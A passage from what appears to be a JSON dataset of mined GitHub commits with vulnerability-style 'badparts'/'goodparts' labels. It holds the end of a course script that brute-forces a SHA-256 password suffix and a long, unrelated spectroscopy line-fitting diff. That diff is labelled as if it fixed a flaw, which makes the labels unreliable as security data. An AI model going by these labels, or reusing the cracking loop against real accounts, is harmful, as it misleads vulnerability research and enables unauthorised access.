letters_of_pswd):\n\t\t\tmyVar = hashlib.sha256((pswd + ''.join(c)).encode('utf-8')).hexdigest()\n\t\t\tif (int(myVar, 16) == int(0x7d9eb5ee94f9ca95d640eb79cc8766fe44d5b9744602469fc6bdc748cb3c41f5)):\n\t\t\t\treturn True, ''.join(c)\n\treturn False, ''\n\nif __name__ == \"__main__\":\n\tPASSWORD = \"blockchain-course.org:\"\n\tMIN_PSWD_LEN = 1\n\tMAX_PSWD_LEN = 5\n\t\n\tstart = time.time()\n\tbroken, c = brute_force_pswd(PASSWORD, MIN_PSWD_LEN, MAX_PSWD_LEN)\n\tend = time.time()\n\tif broken:\n\t\tprint(f\"Success!\\n{c}, {PASSWORD}{c}\")\n\telse:\n\t\tprint(\"Password not found!\")\n\tprint(f\"Brute force time: {end-start} seconds\")\n"}},"msg":"Update brute-force-sha256.py"}},"https:\/\/github.com\/scegbert\/GHzTrioxaneFitting":{"15e165ae011f67e5e9f32a5dbb3569f95d0e2827":{"url":"https:\/\/api.github.com\/repos\/scegbert\/GHzTrioxaneFitting\/commits\/15e165ae011f67e5e9f32a5dbb3569f95d0e2827","html_url":"https:\/\/github.com\/scegbert\/GHzTrioxaneFitting\/commit\/15e165ae011f67e5e9f32a5dbb3569f95d0e2827","message":"more updates to brute force voigt approach","sha":"15e165ae011f67e5e9f32a5dbb3569f95d0e2827","keyword":"brute force update","diff":"diff --git a\/Mid-IRShockTube_COshocks_voigt.py b\/Mid-IRShockTube_COshocks_voigt.py\nindex 74a0abd..2a653c0 100644\n--- a\/Mid-IRShockTube_COshocks_voigt.py\n+++ b\/Mid-IRShockTube_COshocks_voigt.py\n@@ -42,9 +42,9 @@\n plot_fits = False\n save_fits = False\n \n-ig_start = 20 # start processing IG's at #ig_start\n+ig_start = 0 # start processing IG's at #ig_start\n ig_stop = 69 # assume the process has completed itself by ig_stop \n-ig_avg = 10 # how many to average together\n+ig_avg = 1 # how many to average together\n \n ig_inc_shock = 19.5 # average location of the incident shock (this is what the data is clocked off of)\n t_inc2ref_shock = 35 # time between incident and reflected shock in microseconds\n@@ -113,15 +113,28 @@\n T_all =           [ 1200,   1200,  1200,  1500,  1820,  1200,      1200,    1500,    1820]  # temperature in K\n meas_file_names = ['1Ar', '1ArL', '2Ar', '3Ar', '4Ar', '1ArHe', '2ArHe', '3ArHe', '4ArHe']\n \n-#%% -------------------------------------- load model -------------------------------------- \n+#%% -------------------------------------- load HITRAN model -------------------------------------- \n \n df_CO = db.par_to_df(os.path.abspath('') + r'\\linelists\\\\' + molecule_name + '.data')\n \n df_CO = df_CO[(df_CO.nu > wvn2_fit[0]) & (df_CO.nu < wvn2_fit[1])]\n df_CO = df_CO[df_CO.quanta.str.split(expand=True)[0] == '1'] # only looking at fundametal transitions for now\n \n-#%% -------------------------------------- setup for given file and load measurement data -------------------------------------- \n+nu_delta = df_CO.nu.to_list()[1] - df_CO.nu.to_list()[0] # spacing between features\n \n+#%% -------------------------------------- setup model to fit features -------------------------------------- \n+\n+# def Gaussian(x, x0, A, w, zerolevel):\n+#     return A* np.exp(-(x-x0)**2 \/ 2 \/ w**2) + zerolevel\n+\n+def Lorentzian(x, x0, A, w, zerolevel):\n+    return A* w \/ ((x-x0)**2 + (w\/2)**2) + zerolevel\n+\n+parameter_names = ['x0', 'A', 'w', 'zerolevel']\n+\n+\n+#%% -------------------------------------- setup for given file and load measurement data --------------------------------------   \n+    \n fit_results = {}\n \n for i_file, meas_file in enumerate(meas_file_names): \n@@ -144,8 +157,12 @@\n     \n     # program will loop through them like this (assuming bins_avg = 3, ig_start = 15): 15b1+15b2+15b3, 15b2+15b3+15b4, ..., 15b7+15b8+16b1, 15b8+16b1+16b3, ...\n     ig_start_iters = np.arange(ig_start, ig_stop - ig_avg+2)\n+        \n+    fit_results[meas_file] = {}\n     \n-    fit_results[meas_file] = np.zeros((len(ig_start_iters),1+2*len(fits_plot))) \n+    for feature_index, nu_center in df_CO.nu.iteritems():\n+    \n+        fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())] = np.zeros((len(ig_start_iters),5))\n     \n     for i_ig, ig_start_iter in enumerate(ig_start_iters): \n         \n@@ -158,17 +175,7 @@\n     \n         ig_avg_location = (ig_start_iter + ig_stop_iter - 1) \/ 2 - ig_inc_shock  # average full IG periodes post shock\n         t_processing = ig_avg_location \/ dfrep * 1e6 - t_inc2ref_shock  # time referenced to the reflected Shock\n-        fit_results[meas_file][i_ig, 0] = t_processing\n-\n-        if t_processing < 0: \n-            T = T_pre # pre vs post shock temperature\n-        else: \n-            T = T_all[i_file]\n-\n         \n-        if time_resolved_pressure: # if we want time resolved pressure\n-            P = pressure_data_P_smooth[np.argmin(abs(pressure_data_t-t_processing))] \n-            \n         # average IGs together\n         IG_avg = np.mean(IG_all[ig_start_iter:ig_stop_iter,:],axis=0)\n         \n@@ -184,95 +191,63 @@\n         abs_meas = - np.log(trans_meas)\n         \n         \n-        \n-        \n         #%% -------------------------------------- fit features in measurements -------------------------------------- \n         \n-        \n-        df_CO.nu\n-        \n-        nu_delta = 2150.856008 - 2147.081134\n-        \n-        \n-        feature_index = 152\n-        nu_center = 2212.625365\n- \n-        nu_left = nu_center-nu_delta\/2\n-        nu_right = nu_center+nu_delta\/2\n-        i_fits = td.bandwidth_select_td(wvn, [nu_left,nu_right], max_prime_factor=50) # wavenumber indices of interest\n-        \n-        abs_fit = abs_meas[i_fits[0]:i_fits[1]]\n-        wvn_fit = wvn[i_fits[0]:i_fits[1]]\n-\n-    \n-        def Gaussian(x, x0, A, wG, zerolevel):\n-            return A* np.sqrt(np.log(2) \/ np.pi \/ wG**2) * np.exp(-(x-x0)**2*np.log(2) \/ wG**2) + zerolevel\n-        \n-        def Lorentzian(x, x0, A, wL, zerolevel):            \n-            return A* 1\/np.pi * wL \/ (wL**2 + (x-x0)**2) + zerolevel\n-        \n-        def VoigtConv(x, x0, A, wG, wL, zerolevel):\n+        for feature_index, nu_center in df_CO.nu.iteritems():\n             \n-            G = np.fft.fft(Gaussian(x,x0,1,wG,0))\n-            L = np.fft.fft(Lorentzian(x,x0,1,wL,0))\n-            V = np.real(np.fft.fftshift(np.fft.ifft(G*L)))\n+            nu_center -= 0.1\n             \n-            return A* V\/np.trapz(V,x) + zerolevel\n-        \n-        vModel = Model(VoigtConv)\n-        \n-        # general model parameters\n-        A_guess = 0.001\n-        zero_level_guess = np.mean(abs_fit)\n-        \n-        vModel.set_param_hint('x0', value = nu_center, min=nu_left, max=nu_right)\n-        vModel.set_param_hint('A', value = A_guess, min=0)\n-        vModel.set_param_hint('zerolevel', value = zero_level_guess)\n-        \n-        # doppler (thermal) parameters        \n-        Na = 6.02214129e26 # kmol-1, avogadro\n-        k = 1.380649e-23 # m2 kg s-2 K-1, boltzman\n-        M = 28.01 # kg kmol-1, mass of CO\n-        wG_guess = (nu_center * 100) \/ speed_of_light * np.sqrt(2*Na*k*T*np.log(2) \/ M) \/10\n-        vModel.set_param_hint('wG', value = wG_guess, min=0)\n-        \n-        # voigt (collisional) parameters\n-        wL_guess = df_CO.gamma_air[feature_index] * P\n-        vModel.set_param_hint('wL', value = wL_guess, min=0)\n-        \n-        abs_fit_input = VoigtConv(wvn_fit, nu_center, A_guess, wG_guess, wL_guess, zero_level_guess)\n-\n-        plt.plot(wvn_fit, abs_fit, label='measurement')\n-        plt.plot(wvn_fit, abs_fit_input, label='guess')\n-        \n-        result = vModel.fit(abs_fit, x=wvn_fit) #, method='nelder')\n-        \n-        print(result.best_values)\n-        \n-        rl = list(result.best_values.values())\n-    \n-        wvn_fit_fine2 = np.linspace(wvn_fit[0], wvn_fit[-1], 80)\n-        wvn_fit_fine3 = np.linspace(wvn_fit[0], wvn_fit[-1], 5000)\n+            nu_left = nu_center-nu_delta\/4\n+            nu_right = nu_center+nu_delta\/4\n+            i_fits = td.bandwidth_select_td(wvn, [nu_left,nu_right], max_prime_factor=50, print_value=False) # wavenumber indices of interest\n+            \n+            abs_fit = abs_meas[i_fits[0]:i_fits[1]]\n+            wvn_fit = wvn[i_fits[0]:i_fits[1]]\n     \n-        abs_fit_result = VoigtConv(wvn_fit, *rl)\n-        abs_fit_result2 = VoigtConv(wvn_fit_fine2, *rl)\n-        abs_fit_result3 = VoigtConv(wvn_fit_fine3, *rl)\n-\n+            mod = Model(Lorentzian)\n+            \n+            # general model parameters\n+            try: \n+                A_guess = fit_parameters[1] # use previous iteration\n+                w_guess = fit_parameters[3] # use previous iteration\n+            except: \n+                A_guess = 0.01\n+                w_guess = 0.01\n                 \n-        plt.plot(wvn_fit, abs_fit_result, label='fit results')\n-        plt.plot(wvn_fit_fine2, abs_fit_result2, label='fit results2')\n-        plt.plot(wvn_fit_fine3, abs_fit_result3, label='fit results3')\n-\n-        plt.legend()\n+            zero_level_guess = np.mean(abs_fit)\n+            \n+            mod.set_param_hint('x0', value = nu_center, min=nu_left, max=nu_right)\n+            mod.set_param_hint('A', value = A_guess, min=0)\n+            mod.set_param_hint('w', value = w_guess, min=0)\n+            mod.set_param_hint('zerolevel', value = zero_level_guess)\n+                        \n+            mod_fit = mod.fit(abs_fit, x=wvn_fit) #, method='nelder')\n+            fit_parameters = list(mod_fit.best_values.values())\n+            \n+            fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())][i_ig, 0] = t_processing\n+            fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())][i_ig,1:] = fit_parameters\n+            \n         \n+        #%% -------------------------------------- plot stuff -------------------------------------- \n \n+parameter_names = ['x0', 'A', 'w', 'zerolevel']\n \n-        \n-        \n-        \n-        \n-        \n-        asdasdasd\n \n+for i_file, meas_file in enumerate(meas_file_names): \n+    \n+    for feature_index, _ in df_CO.nu.iteritems():\n \n+        x_plot = fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())][:,0]\n         \n+        for i in range(len(fit_parameters)): \n+            \n+            if i == 1 or i ==2: \n+                                \n+                plt.figure(10*i_file + i)\n+                plt.title(meas_file)\n+                y_plot = fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())][:,i+1]\n+                plt.plot(x_plot, y_plot, 'x')\n+                \n+                plt.ylabel(parameter_names[i])\n+            \n+            \n","files":{"\/Mid-IRShockTube_COshocks_voigt.py":{"changes":[{"diff":"\n plot_fits = False\n save_fits = False\n \n-ig_start = 20 # start processing IG's at #ig_start\n+ig_start = 0 # start processing IG's at #ig_start\n ig_stop = 69 # assume the process has completed itself by ig_stop \n-ig_avg = 10 # how many to average together\n+ig_avg = 1 # how many to average together\n \n ig_inc_shock = 19.5 # average location of the incident shock (this is what the data is clocked off of)\n t_inc2ref_shock = 35 # time between incident and reflected shock in microseconds\n","add":2,"remove":2,"filename":"\/Mid-IRShockTube_COshocks_voigt.py","badparts":["ig_start = 20 # start processing IG's at #ig_start","ig_avg = 10 # how many to average together"],"goodparts":["ig_start = 0 # start processing IG's at #ig_start","ig_avg = 1 # how many to average together"]},{"diff":"\n     # program will loop through them like this (assuming bins_avg = 3, ig_start = 15): 15b1+15b2+15b3, 15b2+15b3+15b4, ..., 15b7+15b8+16b1, 15b8+16b1+16b3, ...\n     ig_start_iters = np.arange(ig_start, ig_stop - ig_avg+2)\n+        \n+    fit_results[meas_file] = {}\n     \n-    fit_results[meas_file] = np.zeros((len(ig_start_iters),1+2*len(fits_plot))) \n+    for feature_index, nu_center in df_CO.nu.iteritems():\n+    \n+        fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())] = np.zeros((len(ig_start_iters),5))\n     \n     for i_ig, ig_start_iter in enumerate(ig_start_iters): \n         \n","add":5,"remove":1,"filename":"\/Mid-IRShockTube_COshocks_voigt.py","badparts":["    fit_results[meas_file] = np.zeros((len(ig_start_iters),1+2*len(fits_plot))) "],"goodparts":["    fit_results[meas_file] = {}","    for feature_index, nu_center in df_CO.nu.iteritems():","        fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())] = np.zeros((len(ig_start_iters),5))"]},{"diff":"\n         ig_avg_location = (ig_start_iter + ig_stop_iter - 1) \/ 2 - ig_inc_shock  # average full IG periodes post shock\n         t_processing = ig_avg_location \/ dfrep * 1e6 - t_inc2ref_shock  # time referenced to the reflected Shock\n-        fit_results[meas_file][i_ig, 0] = t_processing\n-\n-        if t_processing < 0: \n-            T = T_pre # pre vs post shock temperature\n-        else: \n-            T = T_all[i_file]\n-\n         \n-        if time_resolved_pressure: # if we want time resolved pressure\n-            P = pressure_data_P_smooth[np.argmin(abs(pressure_data_t-t_processing))] \n-            \n         # average IGs together\n         IG_avg = np.mean(IG_all[ig_start_iter:ig_stop_iter,:],axis=0)\n         \n","add":0,"remove":10,"filename":"\/Mid-IRShockTube_COshocks_voigt.py","badparts":["        fit_results[meas_file][i_ig, 0] = t_processing","        if t_processing < 0: ","            T = T_pre # pre vs post shock temperature","        else: ","            T = T_all[i_file]","        if time_resolved_pressure: # if we want time resolved pressure","            P = pressure_data_P_smooth[np.argmin(abs(pressure_data_t-t_processing))] "],"goodparts":[]},{"diff":"\n         \n         \n-        \n-        \n         #%% -------------------------------------- fit features in measurements -------------------------------------- \n         \n-        \n-        df_CO.nu\n-        \n-        nu_delta = 2150.856008 - 2147.081134\n-        \n-        \n-        feature_index = 152\n-        nu_center = 2212.625365\n- \n-        nu_left = nu_center-nu_delta\/2\n-        nu_right = nu_center+nu_delta\/2\n-        i_fits = td.bandwidth_select_td(wvn, [nu_left,nu_right], max_prime_factor=50) # wavenumber indices of interest\n-        \n-        abs_fit = abs_meas[i_fits[0]:i_fits[1]]\n-        wvn_fit = wvn[i_fits[0]:i_fits[1]]\n-\n-    \n-        def Gaussian(x, x0, A, wG, zerolevel):\n-            return A* np.sqrt(np.log(2) \/ np.pi \/ wG**2) * np.exp(-(x-x0)**2*np.log(2) \/ wG**2) + zerolevel\n-        \n-        def Lorentzian(x, x0, A, wL, zerolevel):            \n-            return A* 1\/np.pi * wL \/ (wL**2 + (x-x0)**2) + zerolevel\n-        \n-        def VoigtConv(x, x0, A, wG, wL, zerolevel):\n+        for feature_index, nu_center in df_CO.nu.iteritems():\n             \n-            G = np.fft.fft(Gaussian(x,x0,1,wG,0))\n-            L = np.fft.fft(Lorentzian(x,x0,1,wL,0))\n-            V = np.real(np.fft.fftshift(np.fft.ifft(G*L)))\n+            nu_center -= 0.1\n             \n-            return A* V\/np.trapz(V,x) + zerolevel\n-        \n-        vModel = Model(VoigtConv)\n-        \n-        # general model parameters\n-        A_guess = 0.001\n-        zero_level_guess = np.mean(abs_fit)\n-        \n-        vModel.set_param_hint('x0', value = nu_center, min=nu_left, max=nu_right)\n-        vModel.set_param_hint('A', value = A_guess, min=0)\n-        vModel.set_param_hint('zerolevel', value = zero_level_guess)\n-        \n-        # doppler (thermal) parameters        \n-        Na = 6.02214129e26 # kmol-1, avogadro\n-        k = 1.380649e-23 # m2 kg s-2 K-1, boltzman\n-        M = 28.01 # kg kmol-1, mass of CO\n-        wG_guess = (nu_center * 100) \/ speed_of_light * np.sqrt(2*Na*k*T*np.log(2) \/ M) \/10\n-        vModel.set_param_hint('wG', value = wG_guess, min=0)\n-        \n-        # voigt (collisional) parameters\n-        wL_guess = df_CO.gamma_air[feature_index] * P\n-        vModel.set_param_hint('wL', value = wL_guess, min=0)\n-        \n-        abs_fit_input = VoigtConv(wvn_fit, nu_center, A_guess, wG_guess, wL_guess, zero_level_guess)\n-\n-        plt.plot(wvn_fit, abs_fit, label='measurement')\n-        plt.plot(wvn_fit, abs_fit_input, label='guess')\n-        \n-        result = vModel.fit(abs_fit, x=wvn_fit) #, method='nelder')\n-        \n-        print(result.best_values)\n-        \n-        rl = list(result.best_values.values())\n-    \n-        wvn_fit_fine2 = np.linspace(wvn_fit[0], wvn_fit[-1], 80)\n-        wvn_fit_fine3 = np.linspace(wvn_fit[0], wvn_fit[-1], 5000)\n+            nu_left = nu_center-nu_delta\/4\n+            nu_right = nu_center+nu_delta\/4\n+            i_fits = td.bandwidth_select_td(wvn, [nu_left,nu_right], max_prime_factor=50, print_value=False) # wavenumber indices of interest\n+            \n+            abs_fit = abs_meas[i_fits[0]:i_fits[1]]\n+            wvn_fit = wvn[i_fits[0]:i_fits[1]]\n     \n-        abs_fit_result = VoigtConv(wvn_fit, *rl)\n-        abs_fit_result2 = VoigtConv(wvn_fit_fine2, *rl)\n-        abs_fit_result3 = VoigtConv(wvn_fit_fine3, *rl)\n-\n+            mod = Model(Lorentzian)\n+            \n+            # general model parameters\n+            try: \n+                A_guess = fit_parameters[1] # use previous iteration\n+                w_guess = fit_parameters[3] # use previous iteration\n+            except: \n+                A_guess = 0.01\n+                w_guess = 0.01\n                 \n-        plt.plot(wvn_fit, abs_fit_result, label='fit results')\n-        plt.plot(wvn_fit_fine2, abs_fit_result2, label='fit results2')\n-        plt.plot(wvn_fit_fine3, abs_fit_result3, label='fit results3')\n-\n-        plt.legend()\n+            zero_level_guess = np.mean(abs_fit)\n+            \n+            mod.set_param_hint('x0', value = nu_center, min=nu_left, max=nu_right)\n+            mod.set_param_hint('A', value = A_guess, min=0)\n+            mod.set_param_hint('w', value = w_guess, min=0)\n+            mod.set_param_hint('zerolevel', value = zero_level_guess)\n+                        \n+            mod_fit = mod.fit(abs_fit, x=wvn_fit) #, method='nelder')\n+            fit_parameters = list(mod_fit.best_values.values())\n+            \n+            fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())][i_ig, 0] = t_processing\n+            fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())][i_ig,1:] = fit_parameters\n+            \n         \n+        #%% -------------------------------------- plot stuff -------------------------------------- \n \n+parameter_names = ['x0', 'A', 'w', 'zerolevel']\n \n-        \n-        \n-        \n-        \n-        \n-        asdasdasd\n \n+for i_file, meas_file in enumerate(meas_file_names): \n+    \n+    for feature_index, _ in df_CO.nu.iteritems():\n \n+        x_plot = fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())][:,0]\n         \n+        for i in range(len(fit_parameters)): \n+            \n+            if i == 1 or i ==2: \n+                                \n+                plt.figure(10*i_file + i)\n+                plt.title(meas_file)\n+                y_plot = fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())][:,i+1]\n+                plt.plot(x_plot, y_plot, 'x')\n+                \n+                plt.ylabel(parameter_names[i])\n+            \n+            \n","add":48,"remove":80,"filename":"\/Mid-IRShockTube_COshocks_voigt.py","badparts":["        df_CO.nu","        nu_delta = 2150.856008 - 2147.081134","        feature_index = 152","        nu_center = 2212.625365","        nu_left = nu_center-nu_delta\/2","        nu_right = nu_center+nu_delta\/2","        i_fits = td.bandwidth_select_td(wvn, [nu_left,nu_right], max_prime_factor=50) # wavenumber indices of interest","        abs_fit = abs_meas[i_fits[0]:i_fits[1]]","        wvn_fit = wvn[i_fits[0]:i_fits[1]]","        def Gaussian(x, x0, A, wG, zerolevel):","            return A* np.sqrt(np.log(2) \/ np.pi \/ wG**2) * np.exp(-(x-x0)**2*np.log(2) \/ wG**2) + zerolevel","        def Lorentzian(x, x0, A, wL, zerolevel):            ","            return A* 1\/np.pi * wL \/ (wL**2 + (x-x0)**2) + zerolevel","        def VoigtConv(x, x0, A, wG, wL, zerolevel):","            G = np.fft.fft(Gaussian(x,x0,1,wG,0))","            L = np.fft.fft(Lorentzian(x,x0,1,wL,0))","            V = np.real(np.fft.fftshift(np.fft.ifft(G*L)))","            return A* V\/np.trapz(V,x) + zerolevel","        vModel = Model(VoigtConv)","        A_guess = 0.001","        zero_level_guess = np.mean(abs_fit)","        vModel.set_param_hint('x0', value = nu_center, min=nu_left, max=nu_right)","        vModel.set_param_hint('A', value = A_guess, min=0)","        vModel.set_param_hint('zerolevel', value = zero_level_guess)","        Na = 6.02214129e26 # kmol-1, avogadro","        k = 1.380649e-23 # m2 kg s-2 K-1, boltzman","        M = 28.01 # kg kmol-1, mass of CO","        wG_guess = (nu_center * 100) \/ speed_of_light * np.sqrt(2*Na*k*T*np.log(2) \/ M) \/10","        vModel.set_param_hint('wG', value = wG_guess, min=0)","        wL_guess = df_CO.gamma_air[feature_index] * P","        vModel.set_param_hint('wL', value = wL_guess, min=0)","        abs_fit_input = VoigtConv(wvn_fit, nu_center, A_guess, wG_guess, wL_guess, zero_level_guess)","        plt.plot(wvn_fit, abs_fit, label='measurement')","        plt.plot(wvn_fit, abs_fit_input, label='guess')","        result = vModel.fit(abs_fit, x=wvn_fit) #, method='nelder')","        print(result.best_values)","        rl = list(result.best_values.values())","        wvn_fit_fine2 = np.linspace(wvn_fit[0], wvn_fit[-1], 80)","        wvn_fit_fine3 = np.linspace(wvn_fit[0], wvn_fit[-1], 5000)","        abs_fit_result = VoigtConv(wvn_fit, *rl)","        abs_fit_result2 = VoigtConv(wvn_fit_fine2, *rl)","        abs_fit_result3 = VoigtConv(wvn_fit_fine3, *rl)","        plt.plot(wvn_fit, abs_fit_result, label='fit results')","        plt.plot(wvn_fit_fine2, abs_fit_result2, label='fit results2')","        plt.plot(wvn_fit_fine3, abs_fit_result3, label='fit results3')","        plt.legend()","        asdasdasd"],"goodparts":["        for feature_index, nu_center in df_CO.nu.iteritems():","            nu_center -= 0.1","            nu_left = nu_center-nu_delta\/4","            nu_right = nu_center+nu_delta\/4","            i_fits = td.bandwidth_select_td(wvn, [nu_left,nu_right], max_prime_factor=50, print_value=False) # wavenumber indices of interest","            abs_fit = abs_meas[i_fits[0]:i_fits[1]]","            wvn_fit = wvn[i_fits[0]:i_fits[1]]","            mod = Model(Lorentzian)","            try: ","                A_guess = fit_parameters[1] # use previous iteration","                w_guess = fit_parameters[3] # use previous iteration","            except: ","                A_guess = 0.01","                w_guess = 0.01","            zero_level_guess = np.mean(abs_fit)","            mod.set_param_hint('x0', value = nu_center, min=nu_left, max=nu_right)","            mod.set_param_hint('A', value = A_guess, min=0)","            mod.set_param_hint('w', value = w_guess, min=0)","            mod.set_param_hint('zerolevel', value = zero_level_guess)","            mod_fit = mod.fit(abs_fit, x=wvn_fit) #, method='nelder')","            fit_parameters = list(mod_fit.best_values.values())","            fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())][i_ig, 0] = t_processing","            fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())][i_ig,1:] = fit_parameters","parameter_names = ['x0', 'A', 'w', 'zerolevel']","for i_file, meas_file in enumerate(meas_file_names): ","    for feature_index, _ in df_CO.nu.iteritems():","        x_plot = fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())][:,0]","        for i in range(len(fit_parameters)): ","            if i == 1 or i ==2: ","                plt.figure(10*i_file + i)","                plt.title(meas_file)","                y_plot = fit_results[meas_file][''.join(df_CO.quanta[feature_index].split())][:,i+1]","                plt.plot(x_plot, y_plot, 'x')","                plt.ylabel(parameter_names[i])"]}],"source":"\n import time import psutil while psutil.cpu_percent() > 80: time.sleep(60*15) import numpy as np import matplotlib.pyplot as plt from scipy.constants import speed_of_light from scipy import signal import os from sys import path path.append(os.path.abspath('..')+'\\\\modules') import pldspectrapy as pld import td_support as td import hapi as hapi import linelist_conversions as db from lmfit import Model import clipboard_and_style_sheet clipboard_and_style_sheet.style_sheet() f_counter_n=10007604.8 fit_pressure=True time_resolved_pressure=True co_argon_database=True fit_concentration=True data_folder=r\"H:\\ShockTubeData\\DATA_MATT_PATRICK_TRIP_2\\CO\\averaged CO shock tube data\\\\\" plot_fits=False save_fits=False ig_start=20 ig_stop=69 ig_avg=10 ig_inc_shock=19.5 t_inc2ref_shock=35 fits_plot=['temperature', 'pressure', 'molefraction', 'shift'] forderLP=2 fcutoffLP=0.15 baseline_TD_start=20 baseline_TD_stop=0 files_vac=['vacuum_background_21.npy', 'vacuum_background_23.npy'] trans_vacs_smooth=[None] * len(files_vac) for i_file, file in enumerate(files_vac): IG_vac=np.load(data_folder +file) ppIG=len(IG_vac) i_center=int((ppIG-1)\/2) +1 trans_vac=np.fft.fftshift(np.fft.fft(np.fft.ifftshift(IG_vac))).__abs__()[i_center:] b, a=signal.butter(forderLP, fcutoffLP) trans_vacs_smooth[i_file]=signal.filtfilt(b, a, trans_vac) wvn_target=2175 wvn2_fit=[2145, 2214] hz2cm=1 \/ speed_of_light \/ 100 frep_n=1010e6 -f_counter_n dfrep=frep_n \/ ppIG favg=frep_n-dfrep\/2 nyq_span=frep_n**2 \/ 2 \/ dfrep nyq_num=np.floor((wvn_target\/hz2cm) \/ nyq_span).astype(int) nyq_start=nyq_num * nyq_span nyq_stop=nyq_start +nyq_span wvn=np.arange(nyq_start, nyq_stop, favg)[1:] * hz2cm wvl=10000 \/ wvn if co_argon_database: molecule_name='CO_Ar' else: molecule_name='CO' molecule_id=5 PL=1.27 y_CO=0.05 T_pre=300 P_pre=0.44 T_all= [ 1200, 1200, 1200, 1500, 1820, 1200, 1200, 1500, 1820] meas_file_names=['1Ar', '1ArL', '2Ar', '3Ar', '4Ar', '1ArHe', '2ArHe', '3ArHe', '4ArHe'] df_CO=db.par_to_df(os.path.abspath('') +r'\\linelists\\\\' +molecule_name +'.data') df_CO=df_CO[(df_CO.nu > wvn2_fit[0]) &(df_CO.nu < wvn2_fit[1])] df_CO=df_CO[df_CO.quanta.str.split(expand=True)[0]=='1'] fit_results={} for i_file, meas_file in enumerate(meas_file_names): if i_file in[1, 5,6,7,8]: i_vac=0 else: i_vac=1 pressure_data=np.loadtxt(r\"H:\\ShockTubeData\\DATA_MATT_PATRICK_TRIP_2\\CO\\averaged CO shock tube data\\Averaged Pressure Profile{}.csv\".format(meas_file), delimiter=',') pressure_data_P=pressure_data[:,1] \/ 1.013 +0.829 pressure_data_t=pressure_data[:,0] * 1000 pressure_data_P_smooth=pressure_data_P.copy() b, a=signal.butter(forderLP, fcutoffLP) pressure_data_P_smooth[np.argmin(abs(pressure_data_t))+1:]=signal.filtfilt(b, a, pressure_data_P[np.argmin(abs(pressure_data_t))+1:]) IG_all=np.load(data_folder+meas_file+'.npy') ig_start_iters=np.arange(ig_start, ig_stop -ig_avg+2) fit_results[meas_file]=np.zeros((len(ig_start_iters),1+2*len(fits_plot))) for i_ig, ig_start_iter in enumerate(ig_start_iters): ig_stop_iter=ig_start_iter +ig_avg print('*************************************************') print('****************** ' +meas_file +' ******************') print('****** IG start:'+str(ig_start_iter)+' IG stop:' +str(ig_stop_iter-1)+' ******************') print('*************************************************') ig_avg_location=(ig_start_iter +ig_stop_iter -1) \/ 2 -ig_inc_shock t_processing=ig_avg_location \/ dfrep * 1e6 -t_inc2ref_shock fit_results[meas_file][i_ig, 0]=t_processing if t_processing < 0: T=T_pre else: T=T_all[i_file] if time_resolved_pressure: P=pressure_data_P_smooth[np.argmin(abs(pressure_data_t-t_processing))] IG_avg=np.mean(IG_all[ig_start_iter:ig_stop_iter,:],axis=0) meas_avg=np.fft.fftshift(np.fft.fft(np.fft.ifftshift(IG_avg))).__abs__()[i_center:] trans_meas=meas_avg \/ trans_vacs_smooth[i_vac] i_target=np.argmin(abs(wvn-wvn_target)) trans_meas=trans_meas \/ max(trans_meas[i_target-50:i_target+50]) abs_meas=-np.log(trans_meas) df_CO.nu nu_delta=2150.856008 -2147.081134 feature_index=152 nu_center=2212.625365 nu_left=nu_center-nu_delta\/2 nu_right=nu_center+nu_delta\/2 i_fits=td.bandwidth_select_td(wvn,[nu_left,nu_right], max_prime_factor=50) abs_fit=abs_meas[i_fits[0]:i_fits[1]] wvn_fit=wvn[i_fits[0]:i_fits[1]] def Gaussian(x, x0, A, wG, zerolevel): return A* np.sqrt(np.log(2) \/ np.pi \/ wG**2) * np.exp(-(x-x0)**2*np.log(2) \/ wG**2) +zerolevel def Lorentzian(x, x0, A, wL, zerolevel): return A* 1\/np.pi * wL \/(wL**2 +(x-x0)**2) +zerolevel def VoigtConv(x, x0, A, wG, wL, zerolevel): G=np.fft.fft(Gaussian(x,x0,1,wG,0)) L=np.fft.fft(Lorentzian(x,x0,1,wL,0)) V=np.real(np.fft.fftshift(np.fft.ifft(G*L))) return A* V\/np.trapz(V,x) +zerolevel vModel=Model(VoigtConv) A_guess=0.001 zero_level_guess=np.mean(abs_fit) vModel.set_param_hint('x0', value=nu_center, min=nu_left, max=nu_right) vModel.set_param_hint('A', value=A_guess, min=0) vModel.set_param_hint('zerolevel', value=zero_level_guess) Na=6.02214129e26 k=1.380649e-23 M=28.01 wG_guess=(nu_center * 100) \/ speed_of_light * np.sqrt(2*Na*k*T*np.log(2) \/ M) \/10 vModel.set_param_hint('wG', value=wG_guess, min=0) wL_guess=df_CO.gamma_air[feature_index] * P vModel.set_param_hint('wL', value=wL_guess, min=0) abs_fit_input=VoigtConv(wvn_fit, nu_center, A_guess, wG_guess, wL_guess, zero_level_guess) plt.plot(wvn_fit, abs_fit, label='measurement') plt.plot(wvn_fit, abs_fit_input, label='guess') result=vModel.fit(abs_fit, x=wvn_fit) print(result.best_values) rl=list(result.best_values.values()) wvn_fit_fine2=np.linspace(wvn_fit[0], wvn_fit[-1], 80) wvn_fit_fine3=np.linspace(wvn_fit[0], wvn_fit[-1], 5000) abs_fit_result=VoigtConv(wvn_fit, *rl) abs_fit_result2=VoigtConv(wvn_fit_fine2, *rl) abs_fit_result3=VoigtConv(wvn_fit_fine3, *rl) plt.plot(wvn_fit, abs_fit_result, label='fit results') plt.plot(wvn_fit_fine2, abs_fit_result2, label='fit results2') plt.plot(wvn_fit_fine3, abs_fit_result3, label='fit results3') plt.legend() asdasdasd ","sourceWithComments":"#%% -------------------------------------- load some libraries -------------------------------------- \n\n# delay until the processor is running below XX% load\nimport time \nimport psutil\nwhile psutil.cpu_percent() > 80: time.sleep(60*15) # hang out for 15 minutes if CPU is busy\n\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nfrom scipy.constants import speed_of_light\nfrom scipy import signal\n\nimport os\nfrom sys import path\npath.append(os.path.abspath('..')+'\\\\modules')\n\nimport 